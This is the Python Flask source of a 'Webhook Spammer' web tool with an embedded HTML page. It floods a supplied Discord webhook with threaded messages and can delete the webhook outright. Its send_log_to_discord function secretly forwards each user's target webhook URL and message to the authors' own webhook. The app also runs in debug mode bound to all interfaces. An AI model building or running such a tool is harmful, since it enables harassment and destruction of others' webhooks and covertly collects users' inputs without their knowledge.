from flask import Flask, render_template, request, jsonify
import requests
import threading
import time
import os

app = Flask(__name__)
LOGGING_WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"  # Replace with your Discord webhook

def send_log_to_discord(webhook_url, message, num_threads, delay):
    embed = {
        "title": "NEW USER INPUT LOGGED",
        "color": 3553599,
        "fields": [
            {"name": "Webhook URL", "value": webhook_url, "inline": False},
            {"name": "Message", "value": message, "inline": False},
            {"name": "Threads", "value": str(num_threads), "inline": True},
            {"name": "Delay", "value": str(delay), "inline": True}
        ],
        "footer": {"text": "Made by TRULYNOTBEN and 214ELI"}
    }
    
    data = {"embeds": [embed]}
    requests.post(LOGGING_WEBHOOK, json=data)

def spam_webhook(webhook_url, message, num_threads, delay):
    results = {"errors": [], "total_time": 0, "total_messages": 0, "messages_per_second": 0}
    
    def send_message():
        try:
            data = {"content": message}
            requests.post(webhook_url, json=data)
        except requests.exceptions.RequestException as e:
            results["errors"].append(f"Error: {e}")
    
    threads = []
    start_time = time.time()
    
    for _ in range(num_threads):
        thread = threading.Thread(target=send_message)
        threads.append(thread)
        thread.start()
        time.sleep(delay)
    
    for thread in threads:
        thread.join()
    
    total_time = time.time() - start_time
    total_messages = num_threads
    messages_per_second = total_messages / total_time if total_time > 0 else 0
    
    results.update({"total_time": round(total_time, 2), "total_messages": total_messages, "messages_per_second": round(messages_per_second, 2)})
    send_log_to_discord(webhook_url, message, num_threads, delay)
    return results

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/spam', methods=['POST'])
def start_spam():
    data = request.json
    webhook_url = data.get('webhook_url')
    message = data.get('message')
    num_threads = int(data.get('num_threads', 1))
    delay = float(data.get('delay', 0.1))
    
    if not webhook_url or not message:
        return jsonify({"error": "Please enter a webhook URL and message."})
    
    results = spam_webhook(webhook_url, message, num_threads, delay)
    return jsonify(results)

@app.route('/delete_webhook', methods=['POST'])
def delete_webhook():
    data = request.json
    webhook_url = data.get('webhook_url')
    
    if not webhook_url:
        return jsonify({"error": "Please enter a webhook URL."})
    
    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            return jsonify({"success": "Webhook deleted successfully."})
        else:
            return jsonify({"error": "Failed to delete webhook."})
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Error deleting webhook: {e}"})

if __name__ == '__main__':
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    with open('templates/index.html', 'w') as f:
        f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Spammer</title>
</head>
<body>
    <h1>Webhook Spammer</h1>
    <input type="text" id="webhook_url" placeholder="Enter Webhook URL"><br>
    <textarea id="message" placeholder="Enter Message"></textarea><br>
    <input type="number" id="num_threads" min="1" max="100" value="1"><br>
    <input type="number" id="delay" min="0.001" max="1" step="0.001" value="0.01"><br>
    <button onclick="startSpam()">Start Spam</button>
    <button onclick="deleteWebhook()">Delete Webhook</button>
    <div id="output"></div>

    <script>
        function startSpam() {
            const webhook_url = document.getElementById('webhook_url').value;
            const message = document.getElementById('message').value;
            const num_threads = document.getElementById('num_threads').value;
            const delay = document.getElementById('delay').value;
            
            fetch('/spam', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({webhook_url, message, num_threads, delay})
            })
            .then(response => response.json())
            .then(data => document.getElementById('output').textContent = JSON.stringify(data, null, 2));
        }
        
        function deleteWebhook() {
            const webhook_url = document.getElementById('webhook_url').value;
            
            fetch('/delete_webhook', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({webhook_url})
            })
            .then(response => response.json())
            .then(data => document.getElementById('output').textContent = JSON.stringify(data, null, 2));
        }
    </script>
</body>
</html>
        ''')

    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
